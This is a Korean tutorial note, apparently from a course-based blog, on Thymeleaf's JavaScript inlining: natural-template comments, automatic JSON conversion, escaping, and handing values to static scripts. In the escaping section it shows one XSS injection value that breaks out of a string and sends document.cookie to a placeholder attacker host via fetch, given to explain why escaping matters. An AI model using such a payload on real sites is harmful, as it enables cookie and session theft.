## 자바스크립트 인라인

<br/>

## 자바스크립트 내추럴 템플릿

타임리프는 HTML 파일을 직접 열어도 동작하는 내추럴 템플릿 기능을 제공한다. 

자바스크립트 인라인 기능을 사용하면 주석을 활용해서 이 기능을 사용할 수 있다

```
인라인 사용 전 출력 `var username2 = /userA/ "test username";`

인라인 사용 후 출력 `var username2 = "userA";`
```

인라인 사용 전 결과를 보면 정말 순수하게 그대로 해석을 해버렸다. 

<br/>따라서 내추럴 템플릿 기능이 동작하지 않고, 심지어 렌더링 내용이 주석처리 되어 버린다

인라인 사용 후 결과를 보면 주석 부분이 제거되고, 기대한 "userA"가 정확하게 적용된다.

<br/><br/>

## 객체

타임리프의 자바스크립트 인라인 기능을 사용하면 객체를 JSON으로 자동으로 변환해준다.



```html
var user = [[${user}]];
```

인라인 사용 전 출력 `var user = BasicController.User(username=userA, age=10);`

인라인 사용 후 출력 `var user = {"username":"userA","age":10};`

<br/><br/>

## 컨트롤러

```java
@Controller
@RequestMapping("/basic")
public class BasicController {
    
    @GetMapping("/javascript")
    public String javascript(Model model) {

        model.addAttribute("user", new User("UserA", 10));
        addUsers(model);

        return "basic/javascript";
    }

    
    private void addUsers(Model model) {
        List<User> list = new ArrayList<>();
        list.add(new User("userA", 10));
        list.add(new User("userB", 20));
        list.add(new User("userC", 30));

        model.addAttribute("users", list);
    }
    
    
    @Data
    static class User {
        private String username;
        private int age;

        public User(String username, int age) {
            this.username = username;
            this.age = age;
        }
    }
}
```

<br/>
<br/> 

## html 파일.



```html
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>

<!-- 자바스크립트 인라인 사용 전 -->
<script>
    var username = [[${user.username}]];
    var age = [[${user.age}]];

    //자바스크립트 내추럴 템플릿
    var username2 = /*[[${user.username}]]*/ "test username";

    //객체
    var user = [[${user}]];
</script>



<!-- 자바스크립트 인라인 사용 후 -->
<script th:inline="javascript">

    //"UserA" 가 변수에 잘 들어간다
    var username = [[${user.username}]];

    //'10' 이 변수에 잘 들어간다.
    var age = [[${user.age}]];

    //자바스크립트 내추럴 템플릿
    var username2 = /*[[${user.username}]]*/ "test username";
    
    //객체를 제이슨으로 넣어준다.
    var user = [[${user}]];
</script>

</body>
</html>
```


<br/><br/>


>**Reference** <br/>[스프링 MVC 2편 - 백엔드 웹 개발 활용 기술](https://www.inflearn.com/course/%EC%8A%A4%ED%94%84%EB%A7%81-mvc-2)
<br/>

## 궁금증!

```java
th:inline 을 안 붙이면 무엇이 잘못되나
```

따옴표가 안 붙는다.

```html
<script>
    const name = [[${member.name}]];
</script>
```

```javascript
const name = 김민석;        // 문법 오류
```

<br/>

`김민석` 이라는 변수를 찾게 되어서 터진다.

<br/>

```html
<script th:inline="javascript">
    const name = [[${member.name}]];
</script>
```

```javascript
const name = "김민석";
```

<br/>

`th:inline="javascript"` 를 붙이면 타입을 보고 알아서 따옴표를 붙인다.

<br/>

## 이스케이프까지 해준다

```java
member.name = 김"민석
```

```javascript
const name = "김\"민석";
```

<br/>

따옴표를 그냥 두면 문자열이 거기서 끊겨서 뒤가 코드가 된다.

<br/>

이게 XSS 통로가 된다.

```java
member.name = "; fetch('http://공격자/?c='+document.cookie); //
```

<br/>

앞의 텍스트 - text, utext 글에서 본 그 공격이

HTML이 아니라 자바스크립트 문맥에서 일어나는 것이다.

<br/>

그래서 자바스크립트 안에 값을 넣을 때는 반드시 `th:inline` 을 써야 한다.

<br/>

## 객체를 통째로 넘길 수 있다

```html
<script th:inline="javascript">
    const member = [[${member}]];
</script>
```

```javascript
const member = {"id":1,"name":"김민석","age":30};
```

<br/>

JSON으로 바뀐다.

<br/>

앞의 API 방식(json), @ResponseBody 글에서 본 Jackson이 여기서도 쓰인다.

<br/>

그래서 같은 함정이 있다.

```java
엔티티를 그대로 넘기면 비밀번호까지 화면 소스에 박힌다
지연 로딩이면 여기서 쿼리가 나가거나 예외가 난다
```

<br/>

화면 소스는 사용자가 볼 수 있으니 더 위험하다.

DTO로 바꿔서 넘겨야 한다.

<br/>

## 자바스크립트 주석 방식

```html
<script th:inline="javascript">
    const name = /*[[${member.name}]]*/ "테스트이름";
</script>
```

<br/>

파일을 그냥 열면 주석이 무시되고 `"테스트이름"` 이 쓰인다.

서버가 그리면 주석 자리의 값으로 `"테스트이름"` 을 덮는다.

<br/>

앞의 타임리프 소개 글에서 본 내추럴 템플릿을 자바스크립트에서 지키는 방법이다.

<br/>

## 반복은 주석 블록으로 쓴다

```html
<script th:inline="javascript">
    const members = [];
    /*[# th:each="member : ${members}"]*/
    members.push([[${member.name}]]);
    /*[/]*/
</script>
```

<br/>

앞의 블록 글에서 본 `th:block` 을 주석 안에 적은 형태다.

<br/>

그런데 이렇게 할 이유가 별로 없다.

객체를 통째로 넘기면 되기 때문이다.

```html
const members = [[${members}]];
```

<br/>

한 줄로 배열이 만들어진다.

<br/>

## 정적 js 파일에서는 안 된다

```html
<script src="/js/app.js"></script>
```

<br/>

이 파일은 타임리프가 처리하지 않는다.

정적 리소스라 그대로 내려간다.

<br/>

값을 넘기려면 HTML 쪽에서 전달해야 한다.

```html
<script th:inline="javascript">
    window.APP_CONFIG = {
        baseUrl: [[@{/}]],
        memberId: [[${member.id}]]
    };
</script>
<script src="/js/app.js"></script>
```

<br/>

전역 변수를 하나 두고 거기서 읽는 방식이다.

<br/>

`data-` 속성으로 넘기는 방법도 있다.

```html
<body th:data-member-id="${member.id}">
```

```javascript
const memberId = document.body.dataset.memberId;
```

<br/>

앞의 제어할 태그 선택하기 글에서 본 `dataset` 이다.

<br/>

전역 변수를 안 쓰는 쪽이 깔끔한데, 값이 많으면 속성이 지저분해진다.

<br/>

## th:inline 에는 다른 모드도 있다

```html
th:inline="javascript"
th:inline="css"
th:inline="text"
th:inline="none"
```

<br/>

`none` 은 인라인 처리를 끄는 것이다.

<br/>

자바스크립트에 배열 리터럴이 있으면 필요해진다.

```javascript
const arr = [[1, 2], [3, 4]];       // 타임리프가 표현식으로 오해한다
```

<br/>

`[[` 가 인라인 표현식의 시작이라 파싱 오류가 나는 것이다.

<br/>

공백을 넣거나 `th:inline="none"` 으로 끄면 된다.

```javascript
const arr = [ [1, 2], [3, 4] ];
```
